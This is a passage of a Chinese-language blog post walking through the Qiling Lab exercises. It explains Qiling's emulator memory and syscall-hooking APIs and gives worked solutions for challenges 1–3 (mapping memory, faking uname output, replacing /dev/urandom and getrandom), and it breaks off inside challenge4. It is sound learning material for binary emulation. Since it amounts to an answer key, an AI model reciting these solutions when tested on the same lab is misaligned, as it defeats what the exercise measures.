    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做完这些lab，对qiling的作用，这个framework的理解，更加的深，希望看到这里的读者可以自己去做一遍，不要纯看他人的wp，因为每道题都有着很多种解法，但是目标都是成功的hook或Hijack，Qiling还有着一些fuzz or 仿真的 example，我都会去做一遍的！同时接下来每周都有着很多考试，希望一切顺利~</p><h2 id="What-is-Qiling"><a href="#What-is-Qiling" class="headerlink" title="What is Qiling"></a>What is Qiling</h2><p>Qiling是一个先进的二进制仿真框架，具有以下特点：</p><ul><li><strong>Qiling</strong> 这个框架对于模拟运行二进制程序时的 hook 非常方便</li><li>模拟多平台：Windows、MacOS、Linux、Android、BSD、UEFI、DOS、MBR、以太坊虚拟机</li><li>模拟多架构：8086、X86、X86_64、ARM、ARM64、MIPS、RISCV、PowerPC</li><li>内置调试器，具有逆向调试功能</li><li>提供深入的内存、寄存器、操作系统级和文件系统级API</li><li>细粒度检测：允许在各个级别进行挂钩（指令&#x2F;基本块&#x2F;内存访问&#x2F;异常&#x2F;系统调用&#x2F;IO&#x2F;等）</li><li>支持跨架构和平台调试能力</li><li>真正的Python框架，可以轻松地在其上构建定制的安全分析工具</li><li>等等</li></ul><p>在qiling framework的github项目上还有几个示例demo，这里注意到了通过Qiling框架仿真模拟并对二进制程序进行hook可以更加方便的fuzz</p><h2 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h2><h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><p>要求在0x1337地址上写入0x1337</p><table><thead><tr><th align="left">Method</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left"><code>map</code></td><td align="left">Map a memory region at a certain location so it become available for access</td></tr><tr><td align="left"><code>unmap</code></td><td align="left">Reclaim a mapped memory region</td></tr><tr><td align="left"><code>unmap_all</code></td><td align="left">Reclaim all mapped memory regions</td></tr><tr><td align="left"><code>map_anywhere</code></td><td align="left">Map a memory region in an unspecified location</td></tr><tr><td align="left"><code>protect</code></td><td align="left">Modify access protection bits of a mapped region (rwx)</td></tr><tr><td align="left"><code>find_free_space</code></td><td align="left">Find an available memory region</td></tr><tr><td align="left"><code>is_available</code></td><td align="left">Query whether a memory region is available</td></tr><tr><td align="left"><code>is_mapped</code></td><td align="left">Query whether a memory region is mapped</td></tr></tbody></table><p>Qiling给出了这些Managing memory的方法</p><p>内存在被访问之前必须被映射。 <code>map</code>方法将连续的内存区域绑定到指定位置，并设置其访问保护位。可以提供字符串标签以便在映射信息表上轻松识别</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.<span class="built_in">map</span>(addr: <span class="built_in">int</span>, size: <span class="built_in">int</span>, perms: <span class="built_in">int</span> = UC_PROT_ALL, info: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>) -&gt; <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>参数：-<code>addr</code> - 请求的映射基地址，应该在页面粒度上；- <code>size</code> - 映射大小（以字节为单位），必须是页面大小； - <code>perms</code> - 保护位图的乘积，定义此内存范围是否可读、可写和&#x2F;或可执行（可选）； - <code>info</code> - 将字符串标签设置为映射范围以方便识别（可选）</p><p>主要也是关注前两个参数，这里显然是执行 <code>ql.mem.map(0x1337// 4096 * 4096 , 0x1000);</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.unmap(addr: <span class="built_in">int</span>, size: <span class="built_in">int</span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure><p>参数： - <code>addr</code> - 要取消映射的区域基地址 - <code>size</code> - 区域大小（以字节为单位）</p><p>如果请求的内存范围未完全映射，则引发： <code>QlMemoryMappedError</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">address = ql.mem.search(<span class="string">b&quot;\xFF\xFE\xFD\xFC\xFB\xFA&quot;</span>, begin= <span class="number">0x1000</span>, end= <span class="number">0x2000</span>)</span><br></pre></td></tr></table></figure><p>从部分内存范围中搜索字符串，begin和end参数均是可选的，去除则是整个内存范围</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.read(address, size)</span><br></pre></td></tr></table></figure><p>从内存中读取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ql.mem.write(address, data)</span><br></pre></td></tr></table></figure><p>写入内存</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">def <span class="title">challenge1</span><span class="params">(ql)</span>:</span></span><br><span class="line"><span class="function">ql.mem.map(<span class="number">0x1337</span>//<span class="number">4096</span>*<span class="number">4096</span> , <span class="number">0x1000</span>)</span></span><br><span class="line"><span class="function">ql.mem.write(<span class="number">0x1337</span>, b<span class="string">&quot;\x39\x05&quot;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge2</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-1CCh]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+18h] [rbp-1C8h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-1C4h]</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">utsname</span> name; <span class="comment">// [rsp+20h] [rbp-1C0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">10</span>]; <span class="comment">// [rsp+1A6h] [rbp-3Ah] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">24</span>]; <span class="comment">// [rsp+1B0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+1C8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">uname</span>(&amp;name) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">perror</span>(<span class="string">&quot;uname&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(s, <span class="string">&quot;QilingOS&quot;</span>);</span><br><span class="line">    s[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(v8, <span class="string">&quot;ChallengeStart&quot;</span>);</span><br><span class="line">    v8[<span class="number">15</span>] = <span class="number">0</span>;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v4 &lt; <span class="built_in">strlen</span>(s) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( name.sysname[v4] == s[v4] )</span><br><span class="line">        ++v2;</span><br><span class="line">      ++v4;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v5 &lt; <span class="built_in">strlen</span>(v8) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( name.version[v5] == v8[v5] )</span><br><span class="line">        ++v3;</span><br><span class="line">      ++v5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 == <span class="built_in">strlen</span>(s) &amp;&amp; v3 == <span class="built_in">strlen</span>(v8) &amp;&amp; v2 &gt; <span class="number">5</span> )</span><br><span class="line">      *a1 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v9;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求在uname返回系统信息时的<code>sysname == &quot;QilingOS&quot; and version == &quot;ChallengeStart&quot;</code>。</p><p>需要通过劫持结构体</p><h4 id="Hijack"><a href="#Hijack" class="headerlink" title="Hijack"></a>Hijack</h4><p>POSIX 系统调用可以被挂钩以允许用户<strong>修改其参数</strong>、<strong>改变返回值</strong>或<strong>完全替换其功能</strong>。系统调用可以通过其名称或编号进行挂钩，并在一个或多个阶段进行拦截： <strong>- QL_INTERCEPT.CALL -</strong> ：当指定的系统调用即将被调用时，可用于完全替换系统调用功能；**- QL_INTERCEPT.ENTER -** ：在进入系统调用之前；可用于篡改系统调用参数值 <strong>- QL_INTERCEPT.EXIT -</strong> ：退出系统调用后，可能被用来篡改返回值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.const <span class="keyword">import</span> QL_INTERCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment"># customized system calls always use the same arguments list as the original</span></span><br><span class="line"><span class="comment"># ones, but with a Qiling instance on front. The Qiling instance may be used</span></span><br><span class="line"><span class="comment"># to interact with various subsystems, such as the memory or registers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_syscall_write</span>(<span class="params">ql: Qiling, fd: <span class="built_in">int</span>, buf: <span class="built_in">int</span>, count: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># read data from emulated memory</span></span><br><span class="line">        data = ql.mem.read(buf, count)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># select the emulated file object that corresponds to the requested</span></span><br><span class="line">        <span class="comment"># file descriptor</span></span><br><span class="line">        fobj = ql.os.fd[fd]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># write the data into the file object, if it supports write operations</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(fobj, <span class="string">&#x27;write&#x27;</span>):</span><br><span class="line">            fobj.write(data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        ret = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret = count</span><br><span class="line"></span><br><span class="line">    ql.log.info(<span class="string">f&#x27;my_syscall_write(<span class="subst">&#123;fd&#125;</span>, <span class="subst">&#123;buf:#x&#125;</span>, <span class="subst">&#123;count&#125;</span>) = <span class="subst">&#123;ret&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># return a value to the caller</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/arm_linux/bin/arm_hello&#x27;</span>], <span class="string">r&#x27;rootfs/arm_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the following call to &#x27;set_syscall&#x27; sets &#x27;my_syscall_write&#x27; to execute whenever</span></span><br><span class="line">    <span class="comment"># the &#x27;write&#x27; system call is about to be called. that practically replaces the</span></span><br><span class="line">    <span class="comment"># existing implementation with the one in &#x27;my_syscall_write&#x27;.</span></span><br><span class="line">    ql.os.set_syscall(<span class="string">&#x27;write&#x27;</span>, my_syscall_write, QL_INTERCEPT.CALL)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># note that system calls may be referred to either by their name or number.</span></span><br><span class="line">    <span class="comment"># an equivalent alternative that replaces the write syscall by refering its number:</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#ql.os.set_syscall(4, my_syscall_write)</span></span><br><span class="line"></span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>因此要通过ql.os.set_syscall中的QL_INTERCEPT.EXIT对返回值进行篡改</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def my_uname_ret(ql ,*args): </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">struct utsname</span><br><span class="line">    &#123;</span><br><span class="line">        char sysname[65];</span><br><span class="line">        char nodename[65];</span><br><span class="line">        char release[65];</span><br><span class="line">        char version[65];</span><br><span class="line">        char machine[65];</span><br><span class="line">        char domainname[65];</span><br><span class="line">    &#125;;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">rdi_value=ql.arch.regs.read(&quot;rdi&quot;)</span><br><span class="line">ql.mem.write(rdi_value,b&#x27;QilingOS\x00&#x27;)</span><br><span class="line">ql.mem.write(rdi_value+65*3,b&#x27;ChallengeStart\x00&#x27;)</span><br><span class="line">return 0</span><br><span class="line"></span><br><span class="line">def challenge2(ql):</span><br><span class="line">ql.os.set_syscall(&quot;uname&quot;,my_uname_ret,QL_INTERCEPT.EXIT)</span><br></pre></td></tr></table></figure><p>这里有个要注意的点，my_uname_ret的参数要能接受三个参数，不然会报错</p><p>这里看到qiling的一个example</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onexit_hook(self.ql, *self.get_syscall_args())</span><br></pre></td></tr></table></figure><p>Qiling都是通过一些函数，来进行hook的</p><blockquote><p>Qiling的这些hook，都是一些在程序的hook，并不像正常的程序的输入输出，例如这里在退出的地方执行这个oxexit_hook函数（个人理解）</p></blockquote><h3 id="challenge3"><a href="#challenge3" class="headerlink" title="challenge3"></a>challenge3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">challenge3</span><span class="params">(_BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-5Ch]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+18h] [rbp-58h]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+1Fh] [rbp-51h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">read</span>(fd, buf, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">read</span>(fd, &amp;v5, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  <span class="built_in">getrandom</span>((__int64)v7, <span class="number">32LL</span>, <span class="number">1LL</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == v7[i] &amp;&amp; buf[i] != v5 )</span><br><span class="line">      ++v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="string">&#x27; &#x27;</span> )</span><br><span class="line">    *a1 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的第一个想法就是hook掉getrandom，控制其函数体，然后将虚拟路径<code>/dev/urandom</code>映射到文件对象下</p><p>以下示例将虚拟路径<code>/dev/urandom</code>映射到托管系统上现有的<code>/dev/urandom</code>文件。当模拟程序访问<code>/dev/random</code>时，将访问映射文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from qiling import Qiling</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    ql = Qiling([r&#x27;rootfs/x86_linux/bin/x86_fetch_urandom&#x27;], r&#x27;rootfs/x86_linux&#x27;)</span><br><span class="line"></span><br><span class="line">    ql.add_fs_mapper(r&#x27;/dev/urandom&#x27;, r&#x27;/dev/urandom&#x27;)</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>以下示例将虚拟路径<code>/dev/random</code>映射到用户定义的文件对象，以允许对交互进行更细粒度的控制。请注意，映射对象扩展了<code>QlFsMappedObject</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qiling <span class="keyword">import</span> Qiling</span><br><span class="line"><span class="keyword">from</span> qiling.os.mapper <span class="keyword">import</span> QlFsMappedObject</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x04&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    ql = Qiling([<span class="string">r&#x27;rootfs/x86_linux/bin/x86_fetch_urandom&#x27;</span>], <span class="string">r&#x27;rootfs/x86_linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure><p>注意到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&quot;\x04&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里其实是一个类，然后定义了一些函数，用self来代替<code>/dev/urandom</code>这个对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">FakeUrandom</span>(<span class="title class_ inherited__">QlFsMappedObject</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">self, size=<span class="built_in">int</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"><span class="keyword">if</span> size==<span class="number">0x20</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x02&quot;</span>*<span class="number">32</span></span><br><span class="line">        <span class="comment"># return a constant value upon reading</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">b&quot;\x01&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fstat</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        <span class="comment"># return -1 to let syscall fstat ignore it</span></span><br><span class="line"><span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close</span>(<span class="params">self</span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_getrandom_func</span>(<span class="params">ql, buf, count:<span class="built_in">int</span>, flag:<span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span><br><span class="line">ql.mem.write(buf,<span class="string">b&#x27;\x02&#x27;</span>*count)</span><br><span class="line"><span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">challenge3</span>(<span class="params">ql</span>):</span><br><span class="line">ql.add_fs_mapper(<span class="string">r&#x27;/dev/urandom&#x27;</span>, FakeUrandom())</span><br><span class="line">ql.os.set_syscall(<span class="string">&quot;getrandom&quot;</span>,my_getrandom_func,QL_INTERCEPT.CALL)</span><br></pre></td></tr></table></figure><h3 id="challenge4"><a href="#challenge4" class="headerlink" title="challenge4"></a>challenge4</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000E1D                               ; __int64 challenge4()</span><br><span class="line">.text:0000000000000E1D                               public challenge4</span><br><span class="line">.text:0000000000000E1D                               challenge4 proc near                    ; CODE XREF: start+18F↓p</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D                               var_18= qword ptr -18h</span><br><span class="line">.text:0000000000000E1D                               var_8= dword ptr -8</span><br><span class="line">.text:0000000000000E1D                               var_4= dword ptr -4</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D                               ; __unwind &#123;</span><br><span class="line">.text:0000000000000E1D 55                            push    rbp</span><br><span class="line">.text:0000000000000E1E 48 89 E5                      mov     rbp, rsp</span><br><span class="line">.text:0000000000000E21 48 89 7D E8                   mov     [rbp+var_18], rdi</span><br><span class="line">.text:0000000000000E25 C7 45 F8 00 00 00 00          mov     [rbp+var_8], 0</span><br><span class="line">.text:0000000000000E2C C7 45 FC 00 00 00 00          mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000000E33 EB 0B                         jmp     short loc_E40</span><br><span class="line">.text:0000000000000E33</span><br><span class="line">.text:0000000000000E35                               ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000E35</span><br><span class="line">.text:0000000000000E35                               loc_E35:                                ; CODE XREF: challenge4+29↓j</span><br><span class="line">.text:0000000000000E35 48 8B 45 E8                   mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000E39 C6 00 01                      mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000E3C 83 45 FC 01                   add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000000E3C</span><br><span class="line">.text:0000000000000E40</span><br><span class="line">.text:0000000000000E40                               loc_E40:                                ; CODE XREF: challenge4+16↑j</span><br><span class="line">.text:0000000000000E40 8B 45 F8                      mov     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000000E43 39 45 FC                      cmp     [rbp+var_4], eax</span><br><span class="line">.text:0000000000000E46 7C ED                         jl      short loc_E35</span><br><span class="line">.text:0000000000000E46</span><br><span class="line">.text:0000000000000E48 90                            nop</span><br><span class="line">.text:0000000000000E49 5D                            pop     rbp</span><br><span class="line">.text:0000000000000E4A C3                            retn</span><br><span class="line">.text:0000000000000E4A                               ; &#125; // starts at E1D</span><br><span class="line">.text:0000000000000E4A</span><br><span class="line">.text:0000000000000E4A                               challenge4 endp</span><br></pre></td></tr></table></figure><p>这里会是一个循环，我们想要的是使参数为真，而loc_E35块可以满足我们的要求，但是<code>jl    